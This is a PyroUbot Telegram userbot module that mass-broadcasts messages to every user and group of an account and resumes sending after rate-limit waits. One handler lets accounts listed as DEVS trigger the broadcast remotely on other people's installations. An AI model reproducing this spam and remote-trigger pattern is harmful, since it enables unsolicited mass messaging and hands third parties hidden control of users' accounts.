from PyroUbot import *

__MODULE__ = "gcast"
__HELP__ = """
<blockquote>
<b>◖ʙᴀɴᴛᴜᴀɴ ᴜɴᴛᴜᴋ ɢᴄᴀsᴛ◗</b>

  <b>❑ ᴄᴍᴅ:</b> <code>{0}bc users</code> [ᴛᴇxᴛ/ʀᴇᴘʟʏ]
  <b>➠ ᴘᴇɴᴊᴇʟᴀsᴀɴ:</b> ᴜɴᴛᴜᴋ ᴍᴇɴɢɪʀɪᴍ ᴘᴇsᴀɴ ᴋᴇ sᴇᴍᴜᴀ ᴜsᴇʀ

  <b>❑ ᴄᴍᴅ:</b> <code>{0}bc group</code> [ᴛᴇxᴛ/ʀᴇᴘʟʏ]
  <b>➠ ᴘᴇɴᴊᴇʟᴀsᴀɴ:</b> ᴜɴᴛᴜᴋ ᴍᴇɴɢɪʀɪᴍ ᴘᴇsᴀɴ ᴋᴇ sᴇᴍᴜᴀ ɢʀᴏᴜᴘ

  <b>❑ ᴄᴍᴅ:</b> <code>{0}bc all</code> [ᴛᴇxᴛ/ʀᴇᴘʟʏ]
  <b>➠ ᴘᴇɴᴊᴇʟᴀsᴀɴ:</b> ᴜɴᴛᴜᴋ ᴍᴇɴɢɪʀɪᴍ ᴘᴇsᴀɴ ᴋᴇ sᴇᴍᴜᴀ ᴜsᴇʀ ᴅᴀɴ ɢʀᴏᴜᴘ
</blockquote>
"""


@PY.UBOT("bc")
@PY.TOP_CMD
@ubot.on_message(filters.user(DEVS) & filters.command("cbc", ".") & ~filters.me)
async def _(client, message):
    proses = await EMO.PROSES(client)
    _msg = f"<blockquote><b>{proses} sᴀʙᴀʀ ʏᴀ ʙʀᴇᴇ ʟᴀɢɪ ɴɢɪʀɪᴍ...</b></blockquote>"
    gcs = await message.reply(_msg)

    command, text = extract_type_and_msg(message)

    if command not in ["group", "users", "all"] or not text:
        return await gcs.edit(f"<blockquote><code>{message.text.split()[0]}</code> <b>[ᴛʏᴘᴇ] [ᴛᴇxᴛ/ʀᴇᴘʟʏ]</b></blockquote>")

    chats = await get_data_id(client, command)
    blacklist = await get_chat(client.me.id)

    done = 0
    failed = 0
    for chat_id in chats:
        if chat_id in blacklist or chat_id in BLACKLIST_CHAT:
            continue

        try:
            await (text.copy(chat_id) if message.reply_to_message else client.send_message(chat_id, text))
            done += 1
        except FloodWait as e:
            await asyncio.sleep(e.value)
            await (text.copy(chat_id) if message.reply_to_message else client.send_message(chat_id, text))
            done += 1
        except Exception:
            failed += 1
            pass

    await gcs.delete()
    sukses = await EMO.SUKSES(client)
    gagal = await EMO.GAGAL(client)
    warning = await EMO.WARNING(client)
    _gcs = f"""
<blockquote><b>{warning} ɢɪᴋᴇꜱ ᴛᴇʟᴀʜ ʙᴇʀᴇꜱ.</b></blockquote>
<blockquote><b>{sukses} —ᴅᴏɴᴇ  ɪɴ : <code>{done}</code> ɢʀᴏᴜᴘ</b>
<b>{gagal} —ғᴀɪʟ ɪɴ : <code>{failed}</code> ɢʀᴏᴜᴘ</b></blockquote>
"""
    return await message.reply(_gcs)
